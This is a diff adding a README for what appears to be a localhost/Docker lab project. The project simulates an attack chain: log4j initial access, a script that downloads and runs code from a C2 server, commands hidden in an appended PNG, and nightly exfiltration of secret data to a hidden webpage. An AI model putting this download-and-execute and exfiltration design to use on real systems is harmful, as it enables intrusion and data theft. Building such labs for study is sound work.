@@ -1,0 +1,42 @@
+TODO:
+- I am still setting up automation
+    - I am going to get the C2 working autonomously
+    - I'll also add some more functionality to the Exfil_data
+- We need to create some "secret data" from the vulnerable-application
+    - I think this should involve how when you attempt to login, it gives a warning that unsuccessful attempts to login are logged
+
+
+How to run on localhost :
+- use ./set_code.sh to add a "secret code" to the
+end of the clean_image.png: this creates secretImage.png which is what we will host on the webserver
+- run python3 -m http.server 8000 to start up the web server
+
+From inside Exfil Data:
+- use ./initial_download.sh to mimic downloading during initial exploit
+- use ./C2.sh to read image hosted on C2 web server
+- C2 will download the image and run according to the code given in set_code.sh
+
+How to run with Docker:
+- There are two Dockerfiles, one in C2 and one in Exfil_data
+- Theres also a build.sh file that can be used to compile these dockerfiles at the same time and create the images used in the docker-compose.yml file
+    - $ ./build.sh
+- I'm using docker desktop since I'm on a mac so just run:
+    - $docker-compose up
+- This should start the two dockerfiles which both create webpages at:
+    - 127.0.0.1:8000 for C2
+    - 127.0.0.1:8080 for exfil_data
+- C2 is run on python because it is our server and I just thought that was easiest
+- Exfil_Data is run on tomcat:8.0.36-jre8 because that is what the vulnerable-application is run on
+- I was trying to get "initial_download" to run automatically at start up, however that wasn't working and isn't super important so we have to run it ourselves for the time being
+- I do pass the IP address of the C2 server as an environmental variable so you can see it under C2_IP in the docker. (it's 172.25.0.2)
+- just run $./initial_download 172.25.0.2 and the exfil_data will pull C2 code down from the C2 server and start running it
+
+Timeline of our Attack:
+- We gain access to the vulnerable_application through log4j (this is all in initial_exploit)
+- We run "initial_download.sh" which downloads code (called C2_code) hosted on our C2 server, gives it the correct permissions, and runs it
+- This script will run continuously from this point on
+- It will sleep until 1:30 am every night at which point it wakesup, checks our C2 server for commands, and executes those commands.
+    - This will typically be posting secret data to a hidden webpage
+- after an hour, it will remove that hidden webpage, and sleep until 1:30 again
+- *Cron doesn't work on the vulnerable-application which means we are calculating how many seconds our program needs to sleep and then sleeping
+- The C2 server can luckily use cron, and will use that to read the secret data from the vulnerable-application every night
